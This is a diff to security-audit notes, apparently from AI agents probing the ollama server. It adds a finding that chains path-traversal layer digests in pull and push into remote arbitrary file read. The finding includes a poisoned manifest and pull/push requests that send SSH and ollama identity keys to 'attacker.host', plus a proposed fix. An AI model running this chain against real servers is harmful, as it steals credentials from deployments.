@@ -63,6 +63,23 @@ Note: some may overlap upstream patterns; regardless they are real remote crashe
 - The "SQL injection" and "auth bypass" scenarios in the brief appear to be DISTRACTORS (or unreachable); the live remote vulns are the model/registry pull + convert paths.
 - C2 escalation dead-ends (root): `fixBlobs` (server/fixblobs.go) only renames `sha256:`→`sha256-`, ignores `.tmp` — not a promoter. Non-.tmp write blocked by hash gate. Manifest write needs download success (unreachable w/ traversal digest).
 
+### C4 (PRIMARY — escalation agent + root-verified) — Remote ARBITRARY FILE READ + EXFILTRATION chain via x/transfer digest (pull-plant → push-read) — HIGH
+This is a genuine multi-bug CHAIN and the strongest finding. Reads any file the ollama daemon can read (SSH keys, TLS keys, `~/.ollama/id_ed25519`, cloud tokens, /etc/passwd) and ships it to an attacker-controlled registry. Fully remote, unauthenticated.
+
+**Bugs chained:**
+1. `x/transfer/transfer.go:170 digestToPath` — no validation (both download & upload use it).
+2. `manifest.ParseNamedManifest` (manifest/manifest.go:112) — json.Decodes manifest, NEVER validates layer digests. So a stored manifest may contain `layer.Digest = "sha256:../../../../etc/passwd"`.
+3. `pushWithTransfer`→`x/transfer/upload.go:248`: `os.Open(filepath.Join(srcDir, digestToPath(blob.Digest)))`, srcDir=`<models>/blobs`, blob.Digest unvalidated → **arbitrary file read**; body streamed to attacker registry via putDirect/putChunked. Reached because `PushModel` (images.go:916) routes to pushWithTransfer when `hasTensorLayers` — satisfied by giving the traversal layer `mediaType=application/vnd.ollama.image.tensor`.
+4. Plant step uses the pull side: `transfer.Download` skip-if-exists at `x/transfer/download.go:106` — `os.Stat(destDir/digestToPath(b.Digest)); fi!=nil && fi.Size()==b.Size` → a traversal digest pointing at an existing local file (Size set to that file's size) is treated as "already downloaded" and SKIPPED. With all layers skipped/downloaded, `Download` returns nil and `pullWithTransfer` writes the RAW attacker manifest verbatim to `PathForName(n)` (images.go:1154).
+
+**Exploit sequence:**
+1. Attacker hosts a registry. `POST /api/pull {"model":"attacker.host/x/y:z","insecure":true}`. Registry serves a manifest with one layer: `{"mediaType":"application/vnd.ollama.image.tensor","digest":"sha256:../../../../../../home/user/.ollama/id_ed25519","size":<exact size of that file>}`. During pull, `os.Stat` resolves the traversal to the real file, size matches → layer skipped → Download OK → poisoned manifest written to `<models>/manifests/attacker.host/x/y/z`.
+2. `POST /api/push {"model":"attacker.host/x/y:z","insecure":true}`. `PushModel` reads the poisoned manifest, `hasTensorLayers`=true → `pushWithTransfer` → `os.Open(<models>/blobs/sha256-../../../../../../home/user/.ollama/id_ed25519)` = the real key file → streamed to attacker registry. Secret exfiltrated.
+
+**Constraint:** plant step (pull skip) needs `Size` == target file's real size. Deterministic for high-value targets (OpenSSH ed25519 key files have fixed size; ollama's own `id_ed25519` is the crown jewel → lets attacker impersonate the victim to ollama.com). Brute-forceable for unknown sizes (pull is cheap; success observable via push). Normal push path (`uploadBlob`) DOES validate via manifest.BlobsPath — only the tensor-transfer push bypasses it.
+
+**Also (same root):** the WRITE side (C2) remains: arbitrary `.tmp` write + arbitrary dir creation. Full RCE via `.tmp`→dlopen is env-dependent/low-confidence (globs `libggml-*.so*` match `.tmp` but exact-name dlopen defeats it). Fix: validate `layer.Digest` against `^sha256[:-][0-9a-f]{64}$` in pull/pushWithTransfer AND in digestToPath, matching manifest.BlobsPath.
+
 ## Active Round 2 agents
 - C2→RCE escalation (find `.tmp`/created-dir consumer, push read primitive, Windows path angle)
 - Template/SSTI RCE (text/template FuncMap, Jinja chat_template)
